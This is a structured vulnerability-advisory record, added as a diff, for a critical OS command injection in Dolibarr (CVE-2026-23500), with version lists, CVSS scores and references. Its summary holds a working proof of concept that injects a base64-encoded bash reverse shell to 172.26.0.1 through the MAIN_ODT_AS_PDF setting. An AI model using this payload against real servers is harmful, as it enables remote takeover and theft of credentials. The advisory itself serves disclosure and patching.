@@ -1,0 +1,198 @@
+advisory_id: GHSA-w5j3-8fcr-h87w
+datasource_id: github_osv/GHSA-w5j3-8fcr-h87w
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-w5j3-8fcr-h87w/GHSA-w5j3-8fcr-h87w.json
+aliases:
+  - CVE-2026-23500
+summary: "Dolibarr: OS Command Injection (RCE) via MAIN_ODT_AS_PDF configuration\n### Summary\n\
+  An authenticated administrator can execute arbitrary operating system commands by injecting\
+  \ a malicious payload into the `MAIN_ODT_AS_PDF` configuration constant. This vulnerability\
+  \ exists because the application fails to properly validate or escape the command path before\
+  \ passing it to the `exec()` function in the ODT to PDF conversion process.\n\n### Details\n\
+  The vulnerability is located in `htdocs/includes/odtphp/odf.php`.\nWhen the system tries to\
+  \ convert an ODT document to PDF (e.g., in Proposals, Invoices), it constructs a shell command\
+  \ using the `MAIN_ODT_AS_PDF` global setting.\n\nCode snippet (`htdocs/includes/odtphp/odf.php`,\
+  \ approx line 930):\n```php\n$command = getDolGlobalString('MAIN_ODT_AS_PDF').' '.escapeshellcmd($name);\n\
+  // ...\nexec($command, $output_arr, $retval);\n```\n\nWhile the filename `$name` is sanitized\
+  \ using `escapeshellcmd()`, the configuration variable `MAIN_ODT_AS_PDF` is retrieved directly\
+  \ from the database and concatenated at the beginning of the string. An attacker with administrative\
+  \ privileges can set this variable to include a command separator (like `;`) followed by arbitrary\
+  \ commands.\n\n### PoC\n**Prerequisites:**\n1. Login as an Administrator.\n2. Ensure the \"\
+  Commercial Proposals\" module is enabled and \"ODT templates\" are activated in its setup.\n\
+  \n**Steps to reproduce (Reverse Shell):**\n\n1.  Start a netcat listener on the attacker's\
+  \ machine (IP: `172.26.0.1`, Port: `4445`):\n   ```bash\n   nc -lvnp 4445\n   ```\n\n2. Prepare\
+  \ the payload. To avoid issues with special characters (like `&` or `>`) being escaped by\
+  \ the web application or shell, encode the reverse shell command in Base64:\n   ```bash\n\
+  \   # Command: bash -c 'bash -i >& /dev/tcp/172.26.0.1/4445 0>&1'\n   echo \"bash -c 'bash\
+  \ -i >& /dev/tcp/172.26.0.1/4445 0>&1'\" | base64\n   # Output: YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjYuMC4xLzQ0NDUgMD4mMScK\n\
+  \   ```\n\n3. Navigate to **Home -> Setup -> Other Setup**.\n\n4. Add or modify the constant\
+  \ `MAIN_ODT_AS_PDF` with the following injection payload:\n   ```bash\n   jodconverter; echo\
+  \ YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjYuMC4xLzQ0NDUgMD4mMScK | base64 -d | bash\n\
+  \   ```\n   *(Explanation: `jodconverter` satisfies the initial check, `;` acts as a command\
+  \ separator, and the pipeline decodes and executes the Base64 payload).*\n<img width=\"1898\"\
+  \ height=\"696\" alt=\"image\" src=\"https://github.com/user-attachments/assets/12e4aa61-eb9d-4342-bd03-9a1e824b8316\"\
+  \ />\n\n5. Navigate to **Commerce -> New proposal**, create a draft, select an ODT template\
+  \ (e.g., `generic_proposal_odt`), and click **Generate**.\n<img width=\"1907\" height=\"668\"\
+  \ alt=\"image\" src=\"https://github.com/user-attachments/assets/d790847e-50c1-47eb-994b-b2596b949242\"\
+  \ />\n<img width=\"1858\" height=\"346\" alt=\"image\" src=\"https://github.com/user-attachments/assets/afbeb170-d004-49d6-a395-1b4572fbf2e7\"\
+  \ />\n<img width=\"848\" height=\"183\" alt=\"image\" src=\"https://github.com/user-attachments/assets/93fbe6c9-96a8-4d0f-ad0e-4aea69f0fec1\"\
+  \ />\n\n6. Check the netcat listener. A connection will be established, granting a shell on\
+  \ the server:\n \n<img width=\"616\" height=\"193\" alt=\"image\" src=\"https://github.com/user-attachments/assets/e90817da-9bb2-4fe1-8377-be10d8640e37\"\
+  \ />\n\n\n### Impact\n**Remote Code Execution (RCE).**\nAn attacker who gains access to an\
+  \ administrator account (or a malicious administrator) can execute arbitrary commands on the\
+  \ underlying server with the privileges of the web server user (typically `www-data`). This\
+  \ allows for:\n- Reading sensitive configuration files (database credentials).\n- Modifying\
+  \ application code.\n- Full system compromise depending on server configuration (e.g., docker\
+  \ escape, pivoting).\n\n---\n\n### Credits\nReported by Łukasz Rybak"
+impacted_packages:
+  - purl: pkg:composer/dolibarr/dolibarr
+    affected_versions: vers:composer/<=22.0.4
+    fixed_versions:
+    affected_packages:
+      - pkg:composer/dolibarr/dolibarr@3.6.0-beta
+      - pkg:composer/dolibarr/dolibarr@3.6.0
+      - pkg:composer/dolibarr/dolibarr@3.6.1
+      - pkg:composer/dolibarr/dolibarr@3.6.2
+      - pkg:composer/dolibarr/dolibarr@3.6.3
+      - pkg:composer/dolibarr/dolibarr@3.6.4
+      - pkg:composer/dolibarr/dolibarr@3.6.5
+      - pkg:composer/dolibarr/dolibarr@3.6.6
+      - pkg:composer/dolibarr/dolibarr@3.7.0
+      - pkg:composer/dolibarr/dolibarr@3.7.1
+      - pkg:composer/dolibarr/dolibarr@3.7.2
+      - pkg:composer/dolibarr/dolibarr@3.7.3
+      - pkg:composer/dolibarr/dolibarr@3.7.4
+      - pkg:composer/dolibarr/dolibarr@3.8.0-beta
+      - pkg:composer/dolibarr/dolibarr@3.8.0
+      - pkg:composer/dolibarr/dolibarr@3.8.1
+      - pkg:composer/dolibarr/dolibarr@3.8.2
+      - pkg:composer/dolibarr/dolibarr@3.8.3
+      - pkg:composer/dolibarr/dolibarr@3.8.4
+      - pkg:composer/dolibarr/dolibarr@3.9.0-rc
+      - pkg:composer/dolibarr/dolibarr@3.9.0-rc2
+      - pkg:composer/dolibarr/dolibarr@3.9.0
+      - pkg:composer/dolibarr/dolibarr@3.9.1
+      - pkg:composer/dolibarr/dolibarr@3.9.2
+      - pkg:composer/dolibarr/dolibarr@3.9.3
+      - pkg:composer/dolibarr/dolibarr@3.9.4
+      - pkg:composer/dolibarr/dolibarr@4.0.0-beta
+      - pkg:composer/dolibarr/dolibarr@4.0.0-rc
+      - pkg:composer/dolibarr/dolibarr@4.0.0-rc2
+      - pkg:composer/dolibarr/dolibarr@4.0.0
+      - pkg:composer/dolibarr/dolibarr@4.0.1
+      - pkg:composer/dolibarr/dolibarr@4.0.2
+      - pkg:composer/dolibarr/dolibarr@4.0.3
+      - pkg:composer/dolibarr/dolibarr@4.0.4
+      - pkg:composer/dolibarr/dolibarr@4.0.5
+      - pkg:composer/dolibarr/dolibarr@4.0.6
+      - pkg:composer/dolibarr/dolibarr@5.0.0-beta
+      - pkg:composer/dolibarr/dolibarr@5.0.0-rc1
+      - pkg:composer/dolibarr/dolibarr@5.0.0-rc2
+      - pkg:composer/dolibarr/dolibarr@5.0.0
+      - pkg:composer/dolibarr/dolibarr@5.0.1
+      - pkg:composer/dolibarr/dolibarr@5.0.2
+      - pkg:composer/dolibarr/dolibarr@5.0.3
+      - pkg:composer/dolibarr/dolibarr@5.0.4
+      - pkg:composer/dolibarr/dolibarr@5.0.5
+      - pkg:composer/dolibarr/dolibarr@5.0.6
+      - pkg:composer/dolibarr/dolibarr@5.0.7
+      - pkg:composer/dolibarr/dolibarr@6.0.0-beta
+      - pkg:composer/dolibarr/dolibarr@6.0.0-rc
+      - pkg:composer/dolibarr/dolibarr@6.0.0
+      - pkg:composer/dolibarr/dolibarr@6.0.1
+      - pkg:composer/dolibarr/dolibarr@6.0.2
+      - pkg:composer/dolibarr/dolibarr@6.0.3
+      - pkg:composer/dolibarr/dolibarr@6.0.4
+      - pkg:composer/dolibarr/dolibarr@6.0.5
+      - pkg:composer/dolibarr/dolibarr@6.0.6
+      - pkg:composer/dolibarr/dolibarr@6.0.7
+      - pkg:composer/dolibarr/dolibarr@6.0.8
+      - pkg:composer/dolibarr/dolibarr@7.0.0
+      - pkg:composer/dolibarr/dolibarr@7.0.1
+      - pkg:composer/dolibarr/dolibarr@7.0.2
+      - pkg:composer/dolibarr/dolibarr@7.0.3
+      - pkg:composer/dolibarr/dolibarr@7.0.4
+      - pkg:composer/dolibarr/dolibarr@7.0.5
+      - pkg:composer/dolibarr/dolibarr@8.0.0
+      - pkg:composer/dolibarr/dolibarr@8.0.1
+      - pkg:composer/dolibarr/dolibarr@8.0.2
+      - pkg:composer/dolibarr/dolibarr@8.0.3
+      - pkg:composer/dolibarr/dolibarr@8.0.4
+      - pkg:composer/dolibarr/dolibarr@8.0.5
+      - pkg:composer/dolibarr/dolibarr@8.0.6
+      - pkg:composer/dolibarr/dolibarr@9.0.0
+      - pkg:composer/dolibarr/dolibarr@9.0.1
+      - pkg:composer/dolibarr/dolibarr@9.0.2
+      - pkg:composer/dolibarr/dolibarr@9.0.3
+      - pkg:composer/dolibarr/dolibarr@9.0.4
+      - pkg:composer/dolibarr/dolibarr@10.0.0
+      - pkg:composer/dolibarr/dolibarr@10.0.1
+      - pkg:composer/dolibarr/dolibarr@10.0.2
+      - pkg:composer/dolibarr/dolibarr@10.0.3
+      - pkg:composer/dolibarr/dolibarr@10.0.4
+      - pkg:composer/dolibarr/dolibarr@10.0.5
+      - pkg:composer/dolibarr/dolibarr@10.0.6
+      - pkg:composer/dolibarr/dolibarr@10.0.7
+      - pkg:composer/dolibarr/dolibarr@11.0.0
+      - pkg:composer/dolibarr/dolibarr@11.0.1
+      - pkg:composer/dolibarr/dolibarr@11.0.2
+      - pkg:composer/dolibarr/dolibarr@11.0.3
+      - pkg:composer/dolibarr/dolibarr@11.0.4
+      - pkg:composer/dolibarr/dolibarr@11.0.5
+      - pkg:composer/dolibarr/dolibarr@12.0.0
+      - pkg:composer/dolibarr/dolibarr@12.0.1
+      - pkg:composer/dolibarr/dolibarr@12.0.2
+      - pkg:composer/dolibarr/dolibarr@12.0.3
+      - pkg:composer/dolibarr/dolibarr@12.0.4
+      - pkg:composer/dolibarr/dolibarr@12.0.5
+      - pkg:composer/dolibarr/dolibarr@13.0.0
+      - pkg:composer/dolibarr/dolibarr@13.0.1
+      - pkg:composer/dolibarr/dolibarr@13.0.2
+      - pkg:composer/dolibarr/dolibarr@13.0.3
+      - pkg:composer/dolibarr/dolibarr@13.0.4
+      - pkg:composer/dolibarr/dolibarr@13.0.5
+      - pkg:composer/dolibarr/dolibarr@14.0.0
+      - pkg:composer/dolibarr/dolibarr@14.0.1
+      - pkg:composer/dolibarr/dolibarr@14.0.2
+      - pkg:composer/dolibarr/dolibarr@14.0.3
+      - pkg:composer/dolibarr/dolibarr@14.0.4
+      - pkg:composer/dolibarr/dolibarr@14.0.5
+      - pkg:composer/dolibarr/dolibarr@15.0.0
+      - pkg:composer/dolibarr/dolibarr@15.0.1
+      - pkg:composer/dolibarr/dolibarr@15.0.2
+      - pkg:composer/dolibarr/dolibarr@15.0.3
+      - pkg:composer/dolibarr/dolibarr@22.0.4
+    fixed_packages: []
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '9.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-w5j3-8fcr-h87w/GHSA-w5j3-8fcr-h87w.json
+  - score: '9.4'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-w5j3-8fcr-h87w/GHSA-w5j3-8fcr-h87w.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-78
+references:
+  - url: https://github.com/Dolibarr/dolibarr
+    reference_type:
+    reference_id:
+  - url: https://github.com/Dolibarr/dolibarr/releases/tag/23.0.0
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-23500
+    reference_type:
+    reference_id: CVE-2026-23500
+  - url: https://github.com/Dolibarr/dolibarr/security/advisories/GHSA-w5j3-8fcr-h87w
+    reference_type:
+    reference_id: GHSA-w5j3-8fcr-h87w
+exploits: []
